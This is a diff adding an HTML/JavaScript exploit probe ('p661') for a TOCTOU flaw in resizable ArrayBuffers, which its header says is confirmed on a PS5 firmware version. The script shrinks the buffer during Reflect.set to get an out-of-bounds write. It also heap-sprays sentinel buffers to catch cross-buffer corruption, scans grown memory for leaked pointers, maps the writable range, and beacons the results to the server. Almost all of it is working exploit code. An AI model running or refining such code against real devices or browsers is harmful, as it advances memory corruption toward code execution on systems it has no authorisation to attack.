@@ -1,0 +1,198 @@
+<!--
+  p661: CVE-2026-84635 resize-during-set TOCTOU
+  Confirmed VULNERABLE on PS5 14.10 (p660: ta[0]=42, receiver ignored)
+  CRASH_CLASS: HIGH (OOB write)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p661</title></head>
+<body>p661: resize TOCTOU
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'), bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=3)flush();}
+function flush(){if(!bQ.length)return;var b=bQ.splice(0,4).join('|');try{var x=new XMLHttpRequest();x.open('GET','/beacon/P661-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,120));flush();};
+function hex64(hi,lo){return('00000000'+(hi>>>0).toString(16)).slice(-8)+('00000000'+(lo>>>0).toString(16)).slice(-8);}
+
+emit('START','v1');flush();
+
+// Phase A: confirm valueOf fires during Reflect.set on TypedArray
+emit('A','confirm-valueOf-fires');
+try{
+  var abA=new ArrayBuffer(256,{maxByteLength:4096});
+  var taA=new Float64Array(abA);
+  var fired=false;
+  Reflect.set(taA,0,{valueOf:function(){fired=true;return 1.5;}},{});
+  emit('A-RESULT','fired='+fired+',ta0='+taA[0]+',sz='+abA.byteLength);
+}catch(e){emit('A-ERR',e.name+':'+e.message);}
+flush();
+
+// Phase B: resize inside valueOf — does the write still land?
+emit('B','resize-during-set');
+try{
+  var abB=new ArrayBuffer(1024,{maxByteLength:4096});
+  var taB=new Float64Array(abB); // 128 doubles
+  for(var i=0;i<128;i++) taB[i]=0;
+  var resized=false;
+  Reflect.set(taB,120,{valueOf:function(){
+    abB.resize(64); // shrink to 8 doubles — index 120 is now WAY OOB
+    resized=true;
+    return 3.14;
+  }},{});
+  emit('B-ALIVE','resized='+resized+',abSz='+abB.byteLength);
+  // grow back and check what's at index 120
+  abB.resize(1024);
+  var readback=taB[120];
+  emit('B-READ','ta120='+readback+' (expect 3.14 if OOB write landed)');
+  if(readback===3.14) emit('B-VERDICT','OOB-WRITE-CONFIRMED');
+  else emit('B-VERDICT','ta120='+readback+' (write may have been blocked)');
+}catch(e){emit('B-ERR',e.name+':'+e.message);}
+flush();
+
+// Phase C: scan for heap residue after grow
+emit('C','heap-residue-scan');
+try{
+  var abC=new ArrayBuffer(64,{maxByteLength:8192});
+  var u8C=new Uint8Array(abC);
+  for(var i=0;i<64;i++) u8C[i]=0;
+  // grow to 8192 and check if new bytes are zero (spec) or contain heap data
+  abC.resize(8192);
+  var u8big=new Uint8Array(abC);
+  var nz=0, first=-1, sample=[];
+  for(var i=64;i<8192;i++){
+    if(u8big[i]!==0){nz++;if(first<0)first=i;}
+  }
+  if(nz>0){
+    for(var j=first;j<Math.min(first+32,8192);j++) sample.push(('0'+u8big[j].toString(16)).slice(-2));
+    emit('C-LEAK','nz='+nz+',first='+first+',sample='+sample.join(''));
+  } else {
+    emit('C-CLEAN','grow-region all zeros (spec compliant)');
+  }
+}catch(e){emit('C-ERR',e.name+':'+e.message);}
+flush();
+
+// Phase D: cross-buffer OOB write detection
+emit('D','cross-buffer-oob');
+try{
+  // Spray 200 ArrayBuffers of 1024 bytes each with sentinel
+  var spray=[];
+  for(var i=0;i<200;i++){
+    var sb=new ArrayBuffer(1024);
+    var sv=new Uint32Array(sb);
+    for(var j=0;j<256;j++) sv[j]=0xBBBB0000|i;
+    spray.push({ab:sb,view:sv});
+  }
+  // Target: resizable AB right in the middle
+  var abD=new ArrayBuffer(1024,{maxByteLength:4096});
+  var taD=new Float64Array(abD);
+  for(var i=0;i<128;i++) taD[i]=0;
+  // More spray after
+  var spray2=[];
+  for(var i=0;i<200;i++){
+    var sb=new ArrayBuffer(1024);
+    var sv=new Uint32Array(sb);
+    for(var j=0;j<256;j++) sv[j]=0xCCCC0000|i;
+    spray2.push({ab:sb,view:sv});
+  }
+  // OOB write: shrink to 64 bytes, write at index 127 (byte 1016)
+  Reflect.set(taD,127,{valueOf:function(){
+    abD.resize(64);
+    return -1.1885959257070704e+148; // 0xDEADBEEFDEADBEEF as float64
+  }},{});
+  emit('D-WRITE','done,abSz='+abD.byteLength);
+  // Check if any spray buffer was corrupted
+  var hits=0;
+  for(var i=0;i<spray.length;i++){
+    for(var j=0;j<256;j++){
+      var v=spray[i].view[j];
+      if(v!==((0xBBBB0000|i)>>>0)){
+        hits++;
+        if(hits<=3) emit('D-HIT','spray['+i+']['+j+']=0x'+((v>>>0).toString(16)));
+      }
+    }
+  }
+  for(var i=0;i<spray2.length;i++){
+    for(var j=0;j<256;j++){
+      var v=spray2[i].view[j];
+      if(v!==((0xCCCC0000|i)>>>0)){
+        hits++;
+        if(hits<=3) emit('D-HIT','spray2['+i+']['+j+']=0x'+((v>>>0).toString(16)));
+      }
+    }
+  }
+  emit('D-RESULT','hits='+hits);
+  if(hits>0) emit('D-VERDICT','CROSS-BUFFER-WRITE-CONFIRMED');
+  else emit('D-VERDICT','no cross-buffer hit (maybe non-adjacent)');
+}catch(e){emit('D-ERR',e.name+':'+e.message);}
+flush();
+
+// Phase E: OOB read via BigUint64Array after shrink+grow
+emit('E','oob-read-attempt');
+try{
+  var abE=new ArrayBuffer(256,{maxByteLength:4096});
+  var taE=new Float64Array(abE);
+  // fill with known pattern
+  for(var i=0;i<32;i++) taE[i]=i+0.5;
+  // shrink during set at high index
+  Reflect.set(taE,31,{valueOf:function(){
+    abE.resize(32); // shrink to 32 bytes = 4 doubles
+    return 9.99;
+  }},{});
+  // now grow to 4096 to expose heap-adjacent bytes
+  abE.resize(4096);
+  var bu=new BigUint64Array(abE);
+  var leaks=[];
+  // scan from byte 256 onward (past original size) for pointer-shaped values
+  for(var i=32;i<512;i++){
+    var v=bu[i];
+    // check for pointer-like values: non-zero, high bits set
+    if(v!==0n){
+      var hi=Number(v>>32n)>>>0;
+      var lo=Number(v&0xFFFFFFFFn)>>>0;
+      leaks.push({off:i*8,hi:hi,lo:lo,hex:hex64(hi,lo)});
+    }
+  }
+  emit('E-SCAN','found='+leaks.length+' non-zero qwords past original size');
+  for(var k=0;k<Math.min(leaks.length,10);k++){
+    var lk=leaks[k];
+    emit('E-LEAK','off='+lk.off+' val=0x'+lk.hex);
+  }
+  if(leaks.length===0) emit('E-VERDICT','grow-region zeroed (spec compliant, no leak)');
+  else emit('E-VERDICT','HEAP-DATA-EXPOSED — '+leaks.length+' non-zero values');
+}catch(e){emit('E-ERR',e.name+':'+e.message);}
+flush();
+
+// Phase F: multiple shrink sizes to map OOB write range
+emit('F','oob-range-map');
+try{
+  var results=[];
+  var sizes=[512,256,128,64,32,16,8];
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    var abF=new ArrayBuffer(1024,{maxByteLength:4096});
+    var taF=new Float64Array(abF);
+    var maxIdx=127; // byte 1016
+    for(var i=0;i<128;i++) taF[i]=0;
+    var ok=false;
+    try{
+      Reflect.set(taF,maxIdx,{valueOf:function(){
+        abF.resize(sz);
+        return 7.77;
+      }},{});
+      ok=true;
+    }catch(e2){ok=false;}
+    abF.resize(1024);
+    var val=taF[maxIdx];
+    results.push('shrink='+sz+':alive='+ok+',val='+(val===7.77?'WRITTEN':''+val));
+  }
+  emit('F-MAP',results.join(' | '));
+}catch(e){emit('F-ERR',e.name+':'+e.message);}
+flush();
+
+emit('DONE','p661-complete');
+flush();
+})();
+</script>
+</body>
+</html>
